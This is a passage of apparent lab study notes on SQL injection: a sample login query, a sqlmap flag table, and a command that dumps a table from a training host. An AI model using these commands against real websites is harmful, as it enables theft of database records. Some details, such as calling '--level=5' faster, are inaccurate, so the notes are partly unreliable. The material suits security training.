```
Username: John

```

SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

```

### Automated SQL Injection Tool

SQLMap - automated tool for detecting and exploiting SQL injection vulnerabilities in web applications.

> We can use it for URL that contains GET parameters because they are most likely to be sensitive to SQL injection.

| Command/flag                        | Description                                                                                          |
| ----------------------------------- | ---------------------------------------------------------------------------------------------------- |
| `sqlmap --wizard`                   | launches tool. --wizard flag will guide you through each step and ask questions to complete the scan |
| `--dbs`                             | extract all the database names                                                                       |
| `-D database_name --tables`         | extract information about the tables from database                                                   |
| `sqlmap -u URL`                     | checks site                                                                                          |
| `sqlmap -r intercepted_request.txt` | POST-based testing                                                                                   |
| `--level=5`                         | faster and more in dept scans                                                                        |
example command of dumping records present in table `thomas`:

```bash
sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
```
